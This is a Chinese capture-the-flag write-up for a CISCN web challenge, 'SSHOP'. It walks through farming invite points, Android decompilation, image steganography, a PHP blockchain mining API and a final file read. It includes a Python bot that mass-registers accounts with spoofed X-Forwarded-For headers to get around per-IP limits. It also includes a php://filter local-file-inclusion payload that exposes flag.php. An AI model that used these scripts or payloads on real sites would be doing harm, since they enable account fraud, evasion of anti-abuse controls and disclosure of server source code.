

# [WEB]SSHOP

Author:ATD-SECURITY-TEAM

解题过程

拿到题目不要激动，首先，注册账号并且登陆再说。

初始赠送1K积分

然后看到商品列表页面

发现Flag的踪迹 flag{6Zev5YWz5o+Q56S6}  其中 6Zev5YWz5o+Q56S6   base64解密为"闯关提示"

点进去查看到详细信息![3](img\3.png)

FLAG IS NOT IN HERE : 5oOz6I635b6XZmxhZyzlsLHor7fotK3kubDml7bmipPljIXvvIzms6jmhI/mt7vliqDotK3nianovablk6Z+

base64解密得 “想获得flag,就请购买时抓包，注意添加购物车哦~”

问题是怎么得到积分呢？于是就需要邀请注册，banner上也提示了。预计要邀请100人。

这时候就需要写一个脚本了，但是需要注意的是，**注册系统中加入了反"薅羊毛"功能，限制了一个同一个ip一天只能注册三个账号，所以需要在原有注册脚本上加入ip伪造的功能。**

exp样例：    相关脚本已打包  请看ciscn-exp.zip内文件

```python 2.7
'''
run with python 2.7
this script is use to invite register user
copyright dxkite@qq.com
'''

import requests as req
import random
from WebHelper import WebHelper
import sys
from pyquery import PyQuery as PQ

class AutoRegister(WebHelper):
    def __init__ (self,ip,port,csrfname='_csrf',invite='DXkite'):
        WebHelper.__init__(self,ip,port)
        self.ip = ip
        self.port = port
        self.url = 'http://%s:%s/' % (ip, port)
        self.csrfname = csrfname
        self.invite = invite

    def _generate_header(self):
        ip = '175.%d.%d.%d' % (random.randint(0,255),random.randint(0,255),random.randint(0,255))
        self.header= {
            'User-Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36',
            'X-Forwarded-For':ip,
            'X-Client-Ip':ip,
        }
    
    def register_user(self):
        self._generate_header();
        session = req.session();
        res=session.get(self.url+'register', headers= self.header);
        # print 'session %s' % session.cookies['__session']
        x,y = self._get_answer(res.text)
        token = self._get_token(res.text)
        password = self._generate_randstr(10)
        
        rs = session.post(url=self.url + 'register', data={
            self.csrfname: token,
            "username": self._generate_randstr(6),
            "password": password,
            "password_confirm": password,
            "mail": self._generate_randstr(5) + '@atd3.cn',
            "invite_user": self.invite,
            "captcha_x": x,
            "captcha_y": y
        },headers = self.header)
        
        try:
            dom = PQ(rs.text)
            error = dom("div.alert.alert-danger")
            error = PQ(error).text().strip()
            if len(error):
                # print "[-] Register failed."
                return False
        except:
            pass
        # print "[+] Register Success With Session %s" % session.cookies['__session'] 
        return True

if __name__ == '__main__':
    ip = sys.argv[1]
    port = sys.argv[2]
    csrfname = sys.argv[3]
    name = sys.argv[4]
    number = sys.argv[5]
    register=AutoRegister(ip, port, csrfname,name)
    for i in range(0,int(number)):
        if register.register_user() == True:
            print '[+] %d Register Success' % i
        else:
            print '[!] %d Register Failed' % i
    
    print '[=] Done'
```

一顿PY后，然后终于邀请到了100人，有足够积分后，购买成功后(前文有提示，一定要**先添加购物车**后结账)，cookies中才会显示相关提示(前文提示抓包的原因就在这里，因为抓包更容易发现隐藏在cookies的flag提示)。

![4](img\4.png)

cookies中显示:flag_tip=6K%2B35LiL6L29YXBw  

由于编码问题把其中6K%2B35LiL6L29YXBw  把%2B换成/     

6K/35LiL6L29YXBw base64解密得:“请下载app”







购买后点击首页的右上角下载APP，接下来就是简单安卓逆向

【**请注意:如果跳过第一步购买直接下载的APP是FAKEAPP、只有在成功购买后才能获得真实的APP下载地址**】

![5](img\5.png)

解包 发现关键代码为解密方法  直接用CS重新写一下 

![6](img\6.png)

```c#
using System.Text;
using static System.Console;

namespace Decode
{
    class Program
    {
        public static void Main()
        {
            int[] code = { 109, 128, 139, 123, 109, 70, 137, 129, 137, 109, 91, 129, 132, 72, 129, 127, 128, 74, 74, 129, 124, 108, 121, 128, 129, 92, 129, 131, 128, 131, 87, 127, 123, 131, 127, 76 };
            Write(Decode(code, 19));
            Read();
        }
        static string Decode(int[] paramArrayOfChar, int length)
        {
            StringBuilder localStringBuilder = new StringBuilder();
            int i = 0;
            int j = paramArrayOfChar.Length;
            while (i < j)
            {
                localStringBuilder.Append((char)(paramArrayOfChar[i] - length));
                i += 1;
            }
            return localStringBuilder.ToString();
        }
    }
}

```

运行解密得到 ZmxhZ3vnvZHnq5nlm77niYfmnInpmpDlhpl9   再Base64解密得到:“flag{网站图片有隐写}”









提示网站图片有隐写，首页就两张图片，测试一下发现是上面的banner存在隐写

binwalk直接得到  flag.7z 与 Seeing is believing.txt 两个文件  其中Seeing is believing.txt明显为密码

（Seeing is believing.txt中的密码可能会被误导为UUencode编码）

文件名Seeing is believing的意思就是眼见为实。

![7](img\7.png)

**其中最后的H与`之间(倒数第一和倒数第二个字符间有特殊字符（零宽度字符%e2%80%8b）**

**可以尝试手动重新打一遍或者编码后在去掉文字中的%e2%80%8b字符最后再转换为原字符**

最后密码为:11FQA9R!I<R!N;W0@:&5R90H`

![8](img\8.png)











302跳转 发现了奇怪的路由 /ciscn_block  然后进入愉快地区块链之旅

访问  /ciscn_block   发现是基于php的区块链 

首页给出了开发提示(api接口)	

查询区块链是否有效	/ciscn_block/search

挖矿地址				/ciscn_block/dig/{你的钱包地址}

考察写脚本能力   先写个挖矿脚本      相关脚本已打包  请看ciscn-exp.zip内文件

```python 2.7
'''
run with python 2.7
this script is use to dig flag coin
copyright dxkite@qq.com
'''

import requests as req
import random
from WebHelper import WebHelper
import sys
from pyquery import PyQuery as PQ
import re


class CoinDigger(WebHelper):
    def __init__(self,host,port,csrfname = '_xsrf',username = 'DXkite',password = 'dxkite'):
        WebHelper.__init__(self,ip,port)
        self.host =host 
        self.port = port
        self.csrfname = csrfname
        self.session = req.session()
        self.wallet = None
        self.username = username
        self.password = password
        self.url = 'http://%s:%s/' % (host, port)
        self.cookie = None
    
    def login(self):
        rs = self.session.get(self.url + 'login')
        html = rs.text
        token = self._get_token(html)
        x,y = self._get_answer(html)
        rs = self.session.post(url=self.url + 'login', data={
            self.csrfname: token,
            "username": self.username,
            "password": self.password,
            "captcha_x": x,
            "captcha_y": y
        })
        try:
            dom = PQ(rs.text)
            error = dom("div.alert.alert-danger")
            error = PQ(error).text().strip()
            if len(error):
                print "[-] Login failed."
                return False
        except:
            pass
        print "[+] Login Success."
        self.wallet = self._get_user_wallet()
        return True
    
    def _get_user_wallet(self):
        res = self.session.get(self.url + 'user')
        dom = PQ(res.text)
        res = dom('.user-wallet').text().strip()
        wallet = re.search('([0-9a-zA-Z]+)$', res).group()
        return wallet

    def dig_coin(self):
        self.cookie = req.utils.dict_from_cookiejar(self.session.cookies)
        self.cookie.pop('__cc_protected','dxkite')
        # print self.cookie
        self.session = req.session()
        req.utils.add_dict_to_cookiejar(self.session.cookies,self.cookie)  
        # print self.session.cookies
        res=self.session.get(self.url + 'ciscn_block/dig/%s' % self.wallet)
        return res

if __name__ == '__main__':
    ip = sys.argv[1]
    port = sys.argv[2]
    csrfname = sys.argv[3]
    name = sys.argv[4]
    pwd = sys.argv[5]
    times = int(sys.argv[6])
    digger=CoinDigger(ip, port, csrfname,name,pwd)
    n = 0
    if digger.login():

        for i in range(0,times):
            coin_str=digger.dig_coin().text
            # print coin_str
            get=re.search('\#(\S+)\#',coin_str)
            if get == None:
                print '[!] Dig faild'
            else:
                print '[+] Dig 1 coin save to %s' % get.group()
                n+=1
 
    print '[=] Done Dig %d in %d' % (n ,times)
```



疯狂挖矿后

好啦  终于挖了500个FlagCoin

返回前台用500个FlagCoin兑换出下一步的地址





/assets/static/fb54f3c5/snow.html

提供个在线解密网站:http://fog.misty.com/perry/ccs/snow/snow/snow.html

snow隐写  查看源码 在底下发现用于snow解密的密码  ATD

解密得

![1](img\1.png)





又提示去前台下载APP  

看到这种形式  /download?file={DATA}/flag.php  

想到文件包含

想到构造/download?file=php://filter/read=convert.base64-encode/resource={DATA}/flag.php

直接下载文件

Base64解密  

最终getflag